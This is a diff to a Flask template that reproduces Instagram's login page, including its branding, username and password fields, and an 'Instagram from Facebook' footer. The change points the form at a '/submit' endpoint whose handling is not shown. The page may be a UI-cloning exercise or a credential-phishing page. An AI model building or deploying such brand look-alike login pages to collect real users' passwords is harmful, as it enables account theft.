@@ -7,6 +7,7 @@
     <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
     <link rel="stylesheet" href="{{ url_for('static', filename='css/media-queries.css') }}">
     <link rel="icon" href="{{ url_for('static', filename='photos/insta-icon.jpg') }}">
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;700&display=swap" rel="stylesheet">
 </head>
 <body>
     <main>
@@ -14,21 +15,18 @@
             <div class="log-in">
                 <img src="{{ url_for('static', filename='photos/logo.png') }}" class="logo">
                 <div class="log-in-form">
-                    <form method="POST" action="/login">
+                    <form method="POST" action="/submit">
                         <input type="text" name="username" placeholder="Phone number, username or email" required>
                         <input type="password" name="password" placeholder="Password" required>
                         <button type="submit" class="log-in-button">Log In</button>
                     </form>
                 </div>
                 
-                <!-- Prikazivanje poruka -->
-                {% with messages = get_flashed_messages(with_categories=true) %}
-                    {% if messages %}
-                        {% for category, message in messages %}
-                            <div class="message {{ category }}">{{ message }}</div>
-                        {% endfor %}
-                    {% endif %}
-                {% endwith %}
+                {% if message %}
+                    <div class="message" style="color: red; margin-top: 10px;">
+                        <p>{{ message }}</p>
+                    </div>
+                {% endif %}
 
                 <span class="or-divider">OR</span>
                 <div class="fb-login">
@@ -39,9 +37,11 @@
                 </div>
                 <a href="#">Forgot password?</a>
             </div>
+
             <div class="sign-up">
                 <span>Don't have an account? <a href="#">Sign up</a></span>
             </div>
+
             <div class="get-the-app">
                 <span>Get the app</span>
                 <div class="app-images">
@@ -50,13 +50,19 @@
                 </div>
             </div>
         </div>
+
+        <div class="phones-container">
+            <img src="{{ url_for('static', filename='photos/phones.png') }}">
+        </div>
     </main>
+
     <footer>
         <ul class="footer-links">
             <li><a href="#">ABOUT</a></li>
             <li><a href="#">HELP</a></li>
             <li><a href="#">PRIVACY</a></li>
             <li><a href="#">TERMS</a></li>
+            <li><a href="#">LANGUAGE</a></li>
         </ul>
         <span class="copyright">&copy; 2025 INSTAGRAM FROM FACEBOOK</span>
     </footer>
